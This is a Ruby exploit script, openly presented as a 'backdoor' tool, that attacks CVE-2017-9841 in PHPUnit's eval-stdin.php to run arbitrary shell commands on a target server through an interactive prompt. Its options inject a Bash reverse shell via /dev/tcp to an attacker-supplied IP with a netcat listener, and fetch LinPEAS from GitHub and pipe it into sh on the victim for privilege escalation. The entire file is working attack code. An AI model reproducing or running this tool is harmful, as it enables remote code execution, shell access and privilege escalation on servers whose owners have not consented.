    #!/usr/bin/ruby
    ​
    #Variables
    shock1 = 'curl -d "<?php system('
    shock2 = ')?>"'
    quote = "'"
    ​
    #Start of the script
    BEGIN {
    puts "Enter full url with eval-stdin.php file:"
    url = gets.chomp
     } 
    ​
    #Command take
    loop do
      print "$ "
      command = gets.chomp
      if command == "clear"
        system("clear")
      elsif command == "help"
        puts "checkconnection - Checks if you are connected to host's shell"
        puts "privesc         - Runs LinPeas on host's machine (privilege escalation script, works only if you have write permission)"
        puts "revshell        - Runs reverse shell attack on host's shell and runs a netcat listener on your local machine"
        puts "exit            - Closes current session"
      elsif command == "checkconnection"
        connectioncheck = system(shock1 + "echo correct"  + shock2 + ' ' + url)
        if connectioncheck == true
          puts "Connection established. Session running."
        elsif connectioncheck != "true"
          puts "Connection not established. Check URL. Maybe target is not vulnerable to CVE-2017-9841"
        end
      elsif command == "privesc"
        system(shock1 + quote + "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh" + quote + shock2 + ' ' + url)
      elsif command == "revshell"
        puts "Enter your ip address here that reverse shell needs to call"
        ip = gets.chomp
        puts "Now you can start your listener in another terminal by typing [nc -lvnp 8080]"
        system(shock1 + quote + "bash -i >& /dev/tcp/" + ip + "/8080 0>&1" + quote + shock2 + ' ' + url)
      elsif command == "exit"
        puts "Terminating process..."
        sleep(3)
        puts "Thank you for using this exploit. I would love to hear your feedback!"
        puts " ____    _    ____ _  ______   ___   ___  ____   "
        puts "| __ )  / \  / ___| |/ /  _ \ / _ \ / _ \|  _ \  "
        puts "|  _ \ / _ \| |   | ' /| | | | | | | | | | |_) | "
        puts "| |_) / ___ \ |___| . \| |_| | |_| | |_| |  _ <  "
        puts "|____/_/   \_\____|_|\_\____/ \___/ \___/|_| \_\ "
        puts " _____ _   _ _____                               "
        puts "|_   _| | | | ____|                              "
        puts "  | | | |_| |  _|                                "
        puts "  | | |  _  | |___                               "
        puts "  |_| |_| |_|_____|                              "
        puts " ____  _        _    _   _ _____ _____           "
        puts "|  _ \| |      / \  | \ | | ____|_   _|          "
        puts "| |_) | |     / _ \ |  \| |  _|   | |            "                    
        puts "|  __/| |___ / ___ \| |\  | |___  | |            "                    
        puts "|_|   |_____/_/   \_\_| \_|_____| |_|            "                    
        puts "                                                 "    
        puts "                                                 "                  
        puts "Made by: Luka Miletic                            " 
        exit
      else
        system(shock1 + quote + command + quote + shock2 + ' ' + url)
      end
    end
